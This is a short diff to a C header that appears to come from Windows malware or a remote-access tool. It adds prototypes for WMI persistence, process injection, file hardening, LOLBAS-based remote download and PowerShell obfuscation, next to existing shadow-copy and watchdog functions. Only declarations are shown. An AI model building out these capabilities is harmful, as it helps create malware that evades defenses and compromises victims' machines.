@@ -98,6 +98,11 @@ const char* sys_protection_status(void);
 const char* sys_check_critical_status_with_name(void);
 int sys_is_admin(void);
 void sys_spawn_shadow_copy(void);
+void sys_wmi_persistence(void);
+void sys_inject_process(void);
+void sys_harden_files(void);
+void sys_lolbas_download(const char *url, const char *outPath);
+char* sys_obfuscate_ps(const char *command);
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam);
 
 /* Clipboard */
